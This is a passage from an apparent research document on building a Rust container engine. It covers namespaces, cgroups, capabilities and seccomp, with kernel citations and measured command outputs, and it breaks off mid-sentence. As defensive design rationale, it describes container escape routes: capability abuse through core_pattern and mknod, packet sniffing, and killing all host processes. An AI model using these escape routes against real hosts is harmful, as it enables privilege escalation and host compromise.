# RND.md — Building a container engine in Rust, from first principles

Research deliverable. **No specification, no task list and no code follows from this document
directly** — it is the corpus a specification session should read first.

**What this is.** The verified output of a five-domain research effort (≈13,600 lines) followed by
an adversarial verification pass by seven independent reviewers (≈11,100 lines) whose job was to
falsify it. Roughly 120 claims were corrected, reversed or downgraded in that pass. **This document
carries the corrected corpus only** — where a claim was falsified it does not appear, except as a
`Trap.` note where a reader would plausibly rediscover it.

**How to read it.** Load the priority index below, then pull individual sections by anchor. The
index is sorted by **importance to future architecture, not by document order**. Sections are
written to be read in isolation.

**The three-category rule.** Every claim is exactly one of **Fact** (what Linux or an OCI
specification requires), **Convention** (what Docker, containerd, runc or crun happen to do) or
**Recommendation** (what our engine should do, with its tradeoff). They are never mixed. If a
sentence seems to combine them, that is an error worth reporting.

**Project constraints, fixed before this research began.** Rust; Linux only; x86_64 first but
without needless architecture coupling; cgroup v2 preferred; root first, rootless later; eventual
OCI compatibility; and the governing principle — **understand and own the runtime core.** Using the
kernel is the point. Delegating container creation to runc, crun or containerd would defeat it.

---

## Priority index

| Tier | Section | Why you would load it |
|---|---|---|
| **P0** | [1. Executive findings](#1-executive-findings) | The twelve findings that change what gets built. Start here, always. |
| **P0** | [18. Decisions we should make now](#18-decisions-we-should-make-now) | Eleven choices that cost a rewrite if made wrong or made late. |
| **P0** | [17. Recommended implementation progression](#17-recommended-implementation-progression) | The eleven-stage ladder. Each stage's goal, non-goals, success test and risks. |
| **P0** | [20. Architectural risks](#20-architectural-risks) | The failure shapes, led by the silent-zero class that smoke tests cannot catch. |
| **P0** | [4. The container creation sequence](#4-the-container-creation-sequence) | The 51-step trace: who acts, which primitive, what privilege, what fails. |
| **P0** | [4.10 Trap index](#410-trap-index) | The steps that appear to work and are wrong. Read with §4. |
| **P0** | [7. Recommended architectural boundaries](#7-recommended-architectural-boundaries) | The process topology, and the five mechanics that are easy to get wrong. |
| **P0** | [3.11 The kernel feature floor](#311-the-kernel-feature-floor) | One table. Feeds the floor decision in §18.7. |
| **P0** | [10.5 Extraction — the most dangerous code in the project](#105-extraction--the-most-dangerous-code-in-the-project) | The most dangerous code in the project, and the CVEs that prove it. |
| **P0** | [13.1 Capabilities](#131-capabilities) | The corrected drop ordering. The natural ordering passes smoke tests and does nothing. |
| **P0** | [15.1 The foundational choice: `rustix`, not `nix`, not raw …](#151-the-foundational-choice-rustix-not-nix-not-raw-libc) | rustix, not nix, not raw libc — and the one finding that settles it. |
| **P0** | [15.4 The post-`clone`, pre-`execve` window](#154-the-post-clone-pre-execve-window) | What may and may not run between clone and execve, and why. |
| **P0** | [19. Decisions we should deliberately postpone](#19-decisions-we-should-deliberately-postpone) | Twelve deferrals, each with why the later cost is bounded. |
| **P0** | [21. Open research questions](#21-open-research-questions) | Every unsettled item with its settling test. Most are blocked on one missing VM. |
| **P1** | [2. What a Linux container actually is](#2-what-a-linux-container-actually-is) | The mechanisms, classified by whether they are required, recommended, hardening or convenience. |
| **P1** | [3. Kernel primitives](#3-kernel-primitives) | The syscall reference: clone3, unshare, setns, both mount APIs, pivot_root, pidfds. |
| **P1** | [5. Container lifecycle](#5-container-lifecycle) | The OCI state machine, the rendezvous, signal forwarding, exit-status collection. |
| **P1** | [6. Runtime architecture comparison](#6-runtime-architecture-comparison) | Boundary by boundary — and whether each one's reason applies to us. |
| **P1** | [6.3 The keystone: the `create`/`start` split is not a Go ar…](#63-the-keystone-the-createstart-split-is-not-a-go-artefact) | Why the create/start split is not a Go artefact. |
| **P1** | [8. The OCI ecosystem](#8-the-oci-ecosystem) | The three specs, the vocabulary, and what can actually grade us. |
| **P1** | [9. Images and registries](#9-images-and-registries) | The pull trace as protocol, not narrative. |
| **P1** | [9.4 Step 4 — content negotiation does not converge, and nev…](#94-step-4--content-negotiation-does-not-converge-and-never-will) | Content negotiation does not converge. The rule a correct client follows. |
| **P1** | [10. Root filesystem and layers](#10-root-filesystem-and-layers) | Layers, whiteouts, OverlayFS, extraction, the content-addressed store. |
| **P1** | [10.4 The headline result: the mount-option page, and how to…](#104-the-headline-result-the-mount-option-page-and-how-to-escape-it) | The 4095-byte page, and escaping it with fsconfig. Decides the kernel floor. |
| **P1** | [11. Networking](#11-networking) | The whole domain. Almost none of it is specified by anyone. |
| **P1** | [11.5 iptables versus nftables, and the decision it forces](#115-iptables-versus-nftables-and-the-decision-it-forces) | Contains the one open question that blocks a ladder stage. |
| **P1** | [11.7 Host state that outlives our process](#117-host-state-that-outlives-our-process) | What leaks, what self-heals, and the cleanup order. |
| **P1** | [11.10 The networking ladder](#1110-the-networking-ladder) | Rungs 1–6, with two corrected orderings. |
| **P1** | [12. cgroups and resource control](#12-cgroups-and-resource-control) | The v2 model, the limit formulas, stop semantics, OOM detection. |
| **P1** | [12.9 `CLONE_INTO_CGROUP` — a correctness trap at the Rust b…](#129-clone_into_cgroup--a-correctness-trap-at-the-rust-boundary) | The constant that truncates to zero and silently voids every limit. |
| **P1** | [13. Security model](#13-security-model) | Capabilities, seccomp, user namespaces, /proc, devices, escape classes, LSMs. |
| **P1** | [13.7 Escape classes — the general rule first, the CVEs as i…](#137-escape-classes--the-general-rule-first-the-cves-as-instances) | The general rule first, the CVEs as instances of it. |
| **P1** | [14. Rootless containers](#14-rootless-containers) | What works, what degrades, what lies — and where the seam is. |
| **P1** | [15. The Rust ecosystem](#15-the-rust-ecosystem) | Crate by crate, judged on whether each hides what we are trying to learn. |
| **P1** | [15.8 Recommended dependency set for the MVP](#158-recommended-dependency-set-for-the-mvp) | The MVP dependency list with version floors. |
| **P2** | [2.8 Process isolation is not security isolation](#28-process-isolation-is-not-security-isolation) | The distinction the whole document rests on, drawn on mechanism. |
| **P2** | [13.9 Process isolation versus security isolation](#139-process-isolation-versus-security-isolation) | The same distinction from the security side, with the MVP's honest position. |
| **P2** | [16. Reference implementation lessons](#16-reference-implementation-lessons) | What each mature runtime teaches, and whether its reasons are ours. |
| **P2** | [4.11 What the MVP omits, and what each omission costs](#411-what-the-mvp-omits-and-what-each-omission-costs) | Each omission stated as a consequence rather than a comparison. |
| **P2** | [6.5 The other families — one idea each](#65-the-other-families--one-idea-each) | gVisor, Kata, Apptainer, CRI-O — one transferable idea each. |
| **P2** | [15.3 The trap that justifies this whole section](#153-the-trap-that-justifies-this-whole-section) | The worked example of a dependency failing silently. |
| **P2** | [22. Source index](#22-source-index) | Where every class of primary source lives, and where pinned per-claim citations live. |

**Tiers.** **P0** — load before making any architectural decision. **P1** — load when building that
subsystem. **P2** — reference and context.

---

## 1. Executive findings

Twelve findings that change what gets built. Everything else in this document supports one of them.

### 1.1 A container is not a kernel object

**Fact.** The Linux kernel has no concept of a container. There is no `container_create` syscall, no
container id, nothing to look up. A container is an ordinary process for which a specific list of
kernel features has been configured — namespaces to narrow what it can name, cgroups to bound what
it can consume, capabilities and seccomp and an LSM to narrow what it can ask the kernel to do, and
a filesystem root change to narrow what it can see.

**Recommendation.** This is why the project is tractable, and it is the correct mental model to
build from: we are not implementing a container, we are composing roughly a dozen kernel mechanisms
in a specific order. The order is where the difficulty lives, not the mechanisms.

### 1.2 The dangerous failures are silent, and smoke tests do not catch them

The highest-value findings in this research share one shape: **the syscall succeeds and the
guarantee is absent.**

- A clone flag exposed by the standard libc binding at a width too narrow for its value **truncates
  to zero**. The clone succeeds, returns no error, and the child lands in the parent's cgroup.
  Every resource limit appears configured and none apply.
- The legacy mount options page truncates at 4095 bytes **silently** — a mount with 4095 valid bytes
  plus trailing garbage returns success.
- The natural ordering of a capability drop returns `EPERM` for every non-root container user **and
  silently succeeds for `USER root`**, so it passes every test run against a stock image while
  leaving the host's full bounding set in place.
- An OOM counter also counts host-pressure kills, so the engine confidently reports a cause it never
  observed.

**Recommendation.** `mydocker run alpine echo hello` tests nothing about isolation. Every guarantee
must be **asserted after it is established, by reading back what the kernel says, from inside the
container**. This is a test-architecture decision and it belongs in the first stage, not the last.

### 1.3 The process topology is the one thing that cannot be refactored

**Recommendation.** `mydocker run` forks a supervisor and exits; the supervisor — never the CLI — is
the container's parent.

Detach, `ps` after the CLI exits, exit-code collection, signal forwarding, attach, exec and restart
policies are all *features* under this topology and all *rewrites* under any other. Nothing else in
the project has that property.

### 1.4 Threads cannot be un-spawned, so async is a build-time constraint

**Fact.** Several namespace operations require a single-threaded caller, and a multi-threaded
process is what forces runc's two-stage re-exec design in the first place.

**Recommendation.** The process that calls `clone3` is single-threaded and stays that way. This
constrains *dependencies*, not just our code — a crate can introduce a thread pool transitively, and
the obvious cgroups crate does exactly that by way of a D-Bus client. Enforce it as a CI step that
fails the build, not as a review convention. The pull path, which genuinely wants concurrency, is a
**separate process invocation** rather than a module boundary.

### 1.5 The `create`/`start` split survives, for different reasons than usually given

**Fact.** The split is commonly explained as an artefact of Go's threaded runtime. That explanation
is incomplete. The kernel constraint is `CLONE_FS` and `thread_group_empty()`, and the OCI Runtime
Spec independently mandates the split in several clauses of which only one concerns hooks.

**Recommendation.** A single-threaded Rust runtime still wants the split — so build it, but build it
knowing which parts are kernel-imposed and which are Go scaffolding we do not need to copy.

### 1.6 The minimum kernel version is an architectural decision

**Recommendation.** Primary target **6.7 or later**; hard minimum **5.15**, documented, with the
degradation stated.

**Fact.** 6.7 is where overlay layers can be supplied through individual `fsconfig` calls instead of
one 4095-byte options page — measured at 300 layers mounted and readable, against a real ceiling of
500. Below it, a many-layer image requires reimplementing overlay2's short-symlink indirection,
which is a meaningful amount of code existing only to fit inside a page. The sub-floors that 6.7
subsumes: 5.7 for race-free cgroup placement, 5.11 for unprivileged overlay in a user namespace and
for `CLOSE_RANGE_CLOEXEC`, 5.15 for the resource-control feature set.

**Trap.** A flag's kernel version is not its syscall's version. `close_range` is 5.9;
`CLOSE_RANGE_CLOEXEC` is 5.11. Probing the syscall and concluding the flag exists is an error this
research made once. Probe the feature, never the version number.

### 1.7 Path length is a budget, enforced in two unrelated places, silent when exceeded

**Fact.** `sun_path` is 108 bytes, and the natural runtime-socket path is already 105. `fsconfig`
caps each string value at 255 bytes, so a deep store root stops the many-layer overlay mount from
working at all.

**Recommendation.** Runtime sockets live under a short `/run/mydocker/<12-hex>/`. The store root
stays shallow — about 160 bytes — so that `<root>/layers/<ns>/<64-hex>/diff` fits. Both are layout
decisions that are free now and migrations later.

### 1.8 Registry content negotiation does not converge and never will

**Fact.** Docker Hub ignores the `Accept` header entirely. Two other major registries return `404
MANIFEST_UNKNOWN` when `Accept` is absent or lacks the stored type. A fourth converts on the fly and
returns **three different digests for one tag** depending on what was requested. The specification's
own content-negotiation document is a `TODO`.

**Recommendation.** Always send the full type list; always classify by the response `Content-Type`,
never by what was asked for. Any cached tag→digest record must store the `Accept` list that produced
it, or it will thrash. Recompute every digest — `Docker-Content-Digest` is SHOULD, and the spec
tells clients not to depend on it.

### 1.9 Extraction is the most dangerous code in the project

**Fact.** Three separate projects — moby, runc and crun — shipped container escapes in 2025 and 2026
through image-controlled paths, and at least one of them *after* fixing extraction itself, because a
non-extractor code path still trusted image-derived input.

**Recommendation.** Every image-derived path **in the engine**, not merely in the extractor, is
resolved through one pinned-root handle using `openat2` with `RESOLVE_IN_ROOT`. String-checking a
path is not a defence; a layer that creates `etc -> /` defeats it. Treat the layer store as a
partitioned, content-addressed artefact: keyed by ChainID, partitioned by extended-attribute
namespace, because **layers are not portable across xattr modes and the incompatibility is silent**.

### 1.10 Host state outlives the process, and some of it is permanent

**Fact.** State we create in **our own** firewall tables can be flushed and rebuilt, so it
self-heals. State written into **shared built-in** chains can only be removed by exact match from a
record we kept — if the record is lost, the rule is permanent. An orphaned bridge with live NAT
rules and no owning network was found on a production host during this research and is still there.

**Recommendation.** Reconciliation on startup is a first-class feature, not cleanup polish. The
cleanup order is **unmount the namespace, then rules, then devices** — removing a device first
re-opens its subnet for allocation while orphaning a rule that can never match again.

### 1.11 One networking question blocks a ladder stage and is unresolved

**Fact.** In nftables, `accept` terminates only the current base chain; only `drop` is terminal. On a
host whose `filter/FORWARD` policy is a foreign DROP — a stock `ufw` machine among many — an
`accept` in our own table cannot rescue the packet at any priority.

A purely native-nftables engine therefore gives containers **no network on such a host, silently**.
The options are to detect and refuse, or to write exactly one marked rule into a chain we do not own
and sweep it during reconciliation. Setting the host's policy ourselves is excluded. This must be
decided before networking code is written.

### 1.12 The MVP's security posture must be labelled honestly, in the program's own output

**Fact.** Docker's permissive user-namespace default is survivable *because* capabilities are
dropped, seccomp is applied and an LSM profile is loaded. An MVP that defers all three is not in
Docker's position — it is running a process as real root with a different filesystem view.

**Recommendation.** That is a legitimate stage to pass through, and it is where the learning is. But
it is **process isolation with no security boundary**, and the engine should say so at runtime: a
build with no security controls refuses to run without an explicit flag. Comparing favourably to a
system whose other three defences are intact is the single easiest way to mislead a user of this
project — including its own authors.

---

## 2. What a Linux container actually is

**Fact.** The kernel has no concept of a container. There is no `struct container`, no
`container_create()` syscall, no `/proc` file that enumerates containers, and no kernel object that
owns one. A container is an ordinary process — created by `clone(2)` exactly like any other — whose
view of the system has been narrowed by a specific, enumerable set of independent kernel features,
every one of which exists, is documented, and is useful on its own. "Container" is a userspace word
for a bundle of those features applied together. The bundle is assembled entirely by the runtime;
`lsns`, `ps` and `/proc/<pid>/ns/` show the parts, nothing shows the whole, and that is precisely
why every container runtime keeps its own state directory on disk.

The complete list of mechanisms is short:

| Mechanism | What it narrows | Applied by |
|---|---|---|
| 8 namespace types | which *instance* of a global resource a name resolves to | `clone(2)` flags, `unshare(2)`, `setns(2)` |
| 1 cgroup (v2) | how much CPU/memory/pids/IO the process may consume | `mkdir` + writes under `/sys/fs/cgroup`, or `CLONE_INTO_CGROUP` |
| 5 capability sets | which privileged kernel operations are permitted | `capset(2)`, `prctl(PR_CAPBSET_DROP)`, `prctl(PR_CAP_AMBIENT)` |
| 1 seccomp filter | which syscall numbers are reachable at all | `seccomp(SECCOMP_SET_MODE_FILTER)` |
| 0 or 1 LSM label | what AppArmor/SELinux policy applies | write to `/proc/self/attr/*` |
| the root directory | what `/` resolves to for path lookup | `pivot_root(2)` (not `chroot(2)`) |

Everything else a runtime does — images, layers, networking plumbing, port publishing, logging — is
userspace software built on top of these six.

### 2.1 Namespaces

**Fact.** A namespace is a kernel object that holds one virtualised global resource. Each task
points at one namespace of each type through its `nsproxy`; `getpid()`, `mount(2)`, `bind(2)` and so
on resolve against the pointed-at instance. A process enters a namespace in exactly three ways: it
is *born* in one (`clone(2)` with a `CLONE_NEW*` flag), it *moves itself* into a fresh one
(`unshare(2)`), or it *joins an existing* one (`setns(2)`). Namespaces are reference-counted and
survive as long as a member process lives or an fd (`/proc/<pid>/ns/<type>`, or a bind mount of it)
is held open.

**Fact.** A namespace virtualises *naming*, not *access*. It changes which object a name resolves
to; it adds no permission check of its own. A reference acquired before entry — an open fd, a
mapped page, a pidfd — keeps working afterwards. This single property is the source of most
container escapes and is why §2.8 matters.

#### 2.1.1 Mount — `CLONE_NEWNS` (Linux 2.4.19)

**Fact.** Virtualises the mount table: the list of `struct mount` entries that path resolution walks.
A new mount namespace starts as a **copy** of the caller's mount list, so every host mount is still
visible in it.

**Fact.** It does *not* isolate filesystem contents, superblocks, block devices, the page cache, or
the inode/dentry caches. It does not change your root directory. Critically, **a copy is not
isolated**: `clone_mnt()` copies peer-group membership from the source
(`v6.11/fs/namespace.c#L1320-L1334` — `if ((flag & CL_MAKE_SHARED) || IS_MNT_SHARED(old))
list_add(&mnt->mnt_share, &old->mnt_share)`), so a mount replicated into the new namespace stays in
the host's propagation peer group. On a systemd host `/` is `shared` by default, so unsharing alone
protects nothing in either direction.

**Omit it and:** there is no container. `pivot_root(2)` would repoint the *host's* root; every mount
made for the container would land in the host mount table and stay there after the container died.

**Fact.** `unshare(CLONE_NEWNS)` moves the caller immediately and works from a multithreaded
process — but only the calling *thread* moves, because namespace membership is per-thread.

#### 2.1.2 PID — `CLONE_NEWPID` (Linux 2.6.24)

**Fact.** Virtualises the PID number space. A task has one PID per namespace in its ancestor chain;
`getpid()` returns the innermost. The first process in a new PID namespace is PID 1 and is that
namespace's `child_reaper`.

**Fact.** It does *not* hide processes. It does not remount `/proc`, and a procfs instance inherited
from the host shows every host process regardless of which PID namespace the reader is in — the
instance is pinned to the PID namespace it was mounted in. Measured (kernel 6.11.0-29, Ubuntu
24.10):

```
unshare -m  --propagation private sh -c 'mount -t proc proc /proc; ls /proc | grep -cE "^[0-9]+$"'  -> 163
unshare -mpf --propagation private sh -c 'mount -t proc proc /proc; ls /proc | grep -cE "^[0-9]+$"'  ->   3
unshare -mpf --propagation private sh -c '                         ls /proc | grep -cE "^[0-9]+$"'   -> 164
```

Read the third line: **a new PID namespace with the inherited `/proc` still mounted shows all 164
host processes.** PID isolation and a fresh procfs instance are two separate requirements and
neither alone buys anything.

**Omit it and:** the container sees and can signal every host process it has permission for; `ps`
lists the host; a `kill -9 -1` inside takes the machine down.

**Fact.** `unshare(CLONE_NEWPID)` does **not** move the caller — only its subsequently created
children (`pid_namespaces(7)`). That is why `/proc/<pid>/ns/` exposes a separate
`pid_for_children` link. `clone(CLONE_NEWPID)` *does* place the child directly, as PID 1.

**Fact.** PID 1 of a namespace has three properties no other process has, all of them operationally
load-bearing. (a) A signal whose disposition is `SIG_DFL` is **discarded** unless it is `SIGKILL`/
`SIGSTOP` *from an ancestor or unrelated namespace*, or is kernel-originated —
`v6.11/kernel/signal.c#L82` (`sig_task_ignored`: `SIGNAL_UNKILLABLE && handler == SIG_DFL &&
!(force && sig_kernel_only(sig))`) plus `#L1215`, where `send_signal_locked` derives `force` from
`!task_pid_nr_ns(current, task_active_pid_ns(t))`. Read that derivation carefully: a sender in a
**descendant** namespace still *has* a pid in the init's namespace, so `force` stays false and even
its `SIGKILL` is discarded — a nested container cannot kill its ancestor's init. A *forced* signal
is different again: a synchronous fault routed through `force_sig_info_to_task()`
(`v6.11/kernel/signal.c#L1326`) **clears `SIGNAL_UNKILLABLE` outright** before sending, which is why
a genuinely faulting init dies while `kill -SEGV $$` from the same process is discarded. (b) When it
exits, the kernel `SIGKILL`s every process in the namespace *and the exiting init blocks until the
namespace is empty* — `v6.11/kernel/pid_namespace.c#L170` (`zap_pid_ns_processes`:
`disable_pid_allocation()`, then `group_send_sig_info(SIGKILL, SEND_SIG_PRIV, …)`, then a loop until
`pid_ns->pid_allocated == init_pids`). So when a supervisor's `waitpid`/pidfd reports the init
exited, the PID namespace is already empty — no polling, no teardown race. (c) Orphans in the
namespace reparent to it, not to host PID 1, and `PR_SET_CHILD_SUBREAPER` cannot cross a PID
namespace boundary (`v6.11/kernel/exit.c#L625`, `find_new_reaper` walks `real_parent` only while
`task_pid(reaper)->level == ns_level`).

#### 2.1.3 Network — `CLONE_NEWNET` (Linux 2.6.24, complete 2.6.29)

**Fact.** Virtualises network devices, the IPv4/IPv6 stacks, routing tables, netfilter rules, the
port number space, `/proc/net`, `/sys/class/net`, and the UNIX **abstract** socket namespace.

**Fact.** It does *not* give the container connectivity. A fresh network namespace contains exactly
one device, `lo`, and `lo` is **down**. It does not isolate filesystem-backed UNIX sockets — those
follow the mount namespace — and it creates no veth, bridge, or NAT. All cross-namespace plumbing is
userspace work.

**Omit it and:** the container shares the host stack: it can bind host ports, reach loopback-only
host services, enumerate and reconfigure host interfaces given `CAP_NET_ADMIN`, and sniff traffic
with `CAP_NET_RAW`.

**Convention.** Docker's default capability set includes `CAP_NET_RAW`
(`moby@v28.3.1/oci/caps/defaults.go`), so "no network namespace" and "default capabilities" compose
into a packet sniffer.

#### 2.1.4 UTS — `CLONE_NEWUTS` (Linux 2.6.19)

**Fact.** Virtualises exactly two strings: the hostname (`sethostname(2)`) and the NIS domain name
(`setdomainname(2)`), and the corresponding `uname(2)` fields. It does not virtualise the kernel
release or version — a container always reports the host kernel.

**Omit it and:** `hostname foo` inside the container renames the **host**. Cosmetic for most
workloads, destructive for any image whose entrypoint sets its own hostname.

#### 2.1.5 IPC — `CLONE_NEWIPC` (Linux 2.6.19)

**Fact.** Virtualises System V IPC objects (message queues, semaphore sets, shared memory segments),
POSIX message queues, and the associated `/proc/sys/kernel/{shmmax,shmall,msgmax,…}` and
`/proc/sysvipc/*`.

**Fact.** It does *not* cover POSIX shared memory (`shm_open(3)`) or POSIX named semaphores
(`sem_open(3)`): glibc implements both as files under `/dev/shm`, so they are isolated by the
**mount** namespace. It does not isolate signals, pipes, UNIX sockets, or futexes.

**Omit it and:** containers read and write each other's and the host's SysV segments and can exhaust
the global SysV limits. Separately, the IPC namespace is what makes `mount -t mqueue` legal inside a
user namespace, because `mqueue_init_fs_context` takes `fc->user_ns` from the owner of the caller's
IPC namespace (`v6.11/ipc/mqueue.c`).

#### 2.1.6 User — `CLONE_NEWUSER` (usable from Linux 3.8)

**Fact.** Virtualises the UID/GID number spaces and the capability model, and *owns* every other
namespace: a capability check against a namespaced resource is `ns_capable(<that namespace>->user_ns,
CAP_…)`, not `capable(CAP_…)`.

**Fact.** It maps nothing by itself. A fresh user namespace has an empty `uid_map`/`gid_map` and
every unmapped ID renders as the overflow ID 65534. It grants no privilege over resources that are
not namespaced: `CAP_SYS_TIME`, `CAP_SYS_MODULE` and **`CAP_MKNOD`** are inert outside the initial
user namespace (`user_namespaces(7)`). Measured: inside `unshare -U -m --map-root-user` on kernel
4.18.0-425 with a full 41-capability `CapEff`, `mknod /tmp/x c 1 3` returns `EPERM`.

**Fact.** Capabilities gained from `CLONE_NEWUSER` do **not** survive `execve` unless uid 0 is mapped
in the new namespace. The mechanism is `capabilities(7)`'s root special case: for a non-setuid file
with no file capabilities the file sets are empty, so `P'(permitted) = P'(ambient) = 0` — *unless*
the euid is 0, in which case the file's inheritable and permitted sets are notionally all-ones.
Measured both ways: immediately after `unshare(CLONE_NEWUSER)` with no exec, `CapEff` is
`0x1ffffffffff`; after an `execve` with uid 65534, `CapEff` is `0`.

**Omit it and:** container uid 0 *is* host uid 0. Every capability the container holds is a host
capability; any escape is immediately host root; file ownership on bind mounts is unmediated.

**Fact.** `unshare(CLONE_NEWUSER)` requires a single-threaded caller. The mechanism is not a special
case: `ksys_unshare` forces `CLONE_THREAD|CLONE_FS` whenever `CLONE_NEWUSER` is requested
(`v6.11/kernel/fork.c#L3268`), and `check_unshare_flags` (`#L3195`) rejects `CLONE_THREAD` when
`!thread_group_empty(current)` → `EINVAL`. A side effect worth knowing: it also unshares your
`fs_struct`, so root and cwd stop being shared with anyone.

**Convention.** Docker does not use a user namespace by default. `--userns-remap` is an opt-in,
daemon-wide flag, still so in Docker 29.x; `docker info --format '{{json .SecurityOptions}}'` on a
default install lists `apparmor`, `seccomp`, `cgroupns` and no `userns`.

#### 2.1.7 Cgroup — `CLONE_NEWCGROUP` (Linux 4.6)

**Fact.** Virtualises the cgroup root directory as seen through `/proc/<pid>/cgroup` and through a
`cgroup2` filesystem mounted from inside the namespace. The *creating process's* cgroup at unshare
time becomes the apparent root.

**Fact.** `/proc/<pid>/cgroup` is rendered relative to the **reader's** cgroup namespace, not the
target's. From the host a container's cgroup file shows the absolute path
(`0::/system.slice/docker-….scope`); from inside, `0::/`. Introspection code in the supervisor must
not expect the container's own view.

**Fact — this is not merely cosmetic, which is the common mistake.** Two concrete properties beyond
path hiding:

1. It is a **prerequisite for a correctly rooted `/sys/fs/cgroup` inside the container.**
   `cgroup_namespaces(7)`: "we must remount the … cgroup filesystem from the new shell (i.e.,
   perform the mount from a process that is in the new cgroup namespace)". cgroup2 reuses one
   superblock and sets the new mount's root dentry to the namespace's cgroup directory, which is why
   a container's mountinfo line has a non-`/` root field.
2. With the `nsdelegate` mount option it is a **real migration boundary**.
   `v6.11/Documentation/admin-guide/cgroup-v2.rst`, "Delegation Containment": "For delegations to
   namespaces, containment is achieved by requiring that both the source and destination cgroups are
   reachable from the namespace of the process which is attempting the migration. If either is not
   reachable, the migration is rejected with `-ENOENT`." So a container inside a cgroup namespace
   cannot write pids into cgroups outside its namespace root **even with a writable cgroupfs**.

**Convention.** systemd mounts the unified hierarchy with `nsdelegate`; measured on Ubuntu 24.10 /
kernel 6.11 the live cgroup2 mount options are `rw,nsdelegate,memory_recursiveprot`. Do not assume
it on an arbitrary host — read `/proc/self/mountinfo` for the cgroup2 line.

**Omit it and:** the container reads its full host cgroup path (an information leak that tells an
attacker exactly where to write), `mount -t cgroup2` inside exposes the host hierarchy including
sibling containers, and on an `nsdelegate` host you give up a containment property you were being
handed for free.

#### 2.1.8 Time — `CLONE_NEWTIME` (Linux 5.6)

**Fact.** Virtualises exactly two clock families via per-namespace offsets in
`/proc/<pid>/timens_offsets`: `CLOCK_MONOTONIC` (with `_COARSE`/`_RAW`) and `CLOCK_BOOTTIME` (with
`_ALARM`). Affects `clock_gettime(2)`, `nanosleep(2)`, `timer_settime(2)`, `timerfd_settime(2)` and
`/proc/uptime`.

**Fact.** It does **not** virtualise `CLOCK_REALTIME`. You cannot give a container a different
wall-clock date. That kills most of the use cases people imagine for it.

**Fact.** `unshare(CLONE_NEWTIME)` does not move the caller — only subsequently created children —
so the offsets can be written before anything is inside. `clone3(2)` *can* place a child directly in
a new time namespace; legacy `clone(2)` cannot, because `CLONE_NEWTIME == 0x80` lies inside legacy
`clone`'s `CSIGNAL` mask (`0xff`) and is silently reinterpreted as `exit_signal = 16`.

> **Trap.** `time_namespaces(7)` states "Currently, the only way to create a time namespace is by
> calling `unshare(2)` with the `CLONE_NEWTIME` flag." That is false: measured on kernel 6.11.0-29,
> `clone3()` with `cl_args.flags = 0x80` placed the child in a genuinely new time namespace. The
> kernel confirms the carve-out from the other direction — `clone3_args_valid` rejects
> `CLONE_DETACHED | (CSIGNAL & ~CLONE_NEWTIME)`, i.e. `CLONE_NEWTIME` is explicitly excluded from
> the forbidden signal bits (`v6.11/kernel/fork.c`).

**Omit it and:** essentially nothing breaks. `/proc/uptime` and monotonic clocks show host values.
The real driver upstream is checkpoint/restore (CRIU).

**Convention.** Docker Engine 29.5.0 (2026-05-14) enables a private time namespace for every
container by default on supported kernels, with a `time-namespaces` feature flag to disable it. The
widely repeated claim that "Docker uses six of the eight namespaces" was accurate up to Docker 28.x
and is now seven of eight. It remains true that Docker does not use the **user** namespace by
default.

### 2.2 cgroups (v2)

**Fact.** A cgroup is a directory in the unified hierarchy at `/sys/fs/cgroup`. A process is in
exactly one cgroup; membership is set by writing its pid to `<cgroup>/cgroup.procs`, or atomically at
birth with `clone3(CLONE_INTO_CGROUP)`. Limits are plain file writes: `memory.max`, `memory.swap.max`,
`pids.max`, `cpu.max`, `cpuset.cpus`, `io.max`. Accounting is readable from `memory.current`,
`cpu.stat`, `pids.current`, and events from `memory.events`.

**Fact.** Two structural rules bite immediately. (a) **No-internal-process rule**: a cgroup with
child cgroups may not contain processes, except the root cgroup; violating it gives `EBUSY` on the
`cgroup.procs` write. (b) A controller is only usable in a child if the parent has enabled it in
`cgroup.subtree_control`; otherwise the child has no `memory.max` file at all and the write fails
`ENOENT`.

**Fact.** Cgroups isolate *consumption*, not *visibility* or *privilege*. A cgroup does not hide a
process, does not restrict syscalls, and does not prevent escape to a parent cgroup by itself — that
is the cgroup namespace plus `nsdelegate` (§2.1.7).

**Omit it and:** the container is unbounded. One `fork` bomb or one runaway allocation takes the
host down, and there is no way to report what the container used. Equally important, `cgroup.kill`
(write `1`) is the only teardown primitive that kills a container whose PID 1 you cannot name or
whose init is blocked uninterruptibly — it signals with `SEND_SIG_PRIV`, which per §2.1.2's rules
*does* reach a namespace init.

### 2.3 Capabilities

**Fact.** Linux splits root into ~41 independently droppable bits. A thread carries five sets:
**permitted** (what it may activate), **effective** (what is checked now), **inheritable** (survives
`execve` only in combination with file inheritable bits), **bounding** (a ceiling that masks what any
`execve` in this process or any descendant can ever acquire — dropping is irreversible), and
**ambient** (raised into permitted+effective across `execve` of an unprivileged file).

**Fact.** For a process whose real or effective uid is 0 executing an ordinary file, the `execve`
transformation simplifies to `P'(permitted) = P(inheritable) | P(bounding)` and
`P'(effective) = P'(permitted)` (`capabilities(7)`). With an empty inheritable set — which is the
normal case — **the bounding set is the entire capability policy for a `USER root` container.**

**Fact.** Changing the effective uid from 0 to non-zero clears the **effective** set
unconditionally. `PR_SET_KEEPCAPS` preserves **permitted** across that change, not effective:
`capabilities(7)`, under `SECBIT_KEEP_CAPS`, says in terms "even with the SECBIT_KEEP_CAPS flag set,
the effective capabilities of a thread are cleared when it switches its effective UID to a nonzero
value." This one sentence dictates the whole ordering in §4.

**Omit the drop and:** container PID 1 holds all 41 capabilities in the **initial** user namespace.
`CAP_SYS_ADMIN` alone is a complete escape (mount a fresh procfs, write
`/proc/sys/kernel/core_pattern`); `CAP_SYS_MODULE` loads a kernel module; `CAP_MKNOD` creates a node
for the host's root block device.

**Convention.** Docker's default bounding set is 14 capabilities, `CapBnd = 0xa80425fb`:
`chown, dac_override, fowner, fsetid, kill, setgid, setuid, setpcap, net_bind_service, net_raw,
sys_chroot, mknod, audit_write, setfcap` (`moby@v28.3.1/oci/caps/defaults.go`, unchanged at
`docker-v29.9.2`). `runc spec`'s own default is three: `audit_write`, `kill`, `net_bind_service`.

### 2.4 seccomp

**Fact.** `seccomp(SECCOMP_SET_MODE_FILTER, flags, prog)` attaches a cBPF program evaluated on every
syscall entry, keyed on the syscall number, the architecture (`AUDIT_ARCH_*`), and the raw argument
registers. It is inherited across `fork` and `execve` and cannot be removed. Filters stack: all
installed filters run, and the most restrictive action wins.

**Fact.** Installing a filter requires **either** `CAP_SYS_ADMIN` in the thread's user namespace
**or** the `no_new_privs` bit already set; otherwise `seccomp(2)` returns `EACCES`
(`v6.11/kernel/seccomp.c`). That is the single kernel rule that forces the two-branch install in §4.

**Fact.** A cBPF filter cannot dereference pointers. It sees argument *registers*, so it can match
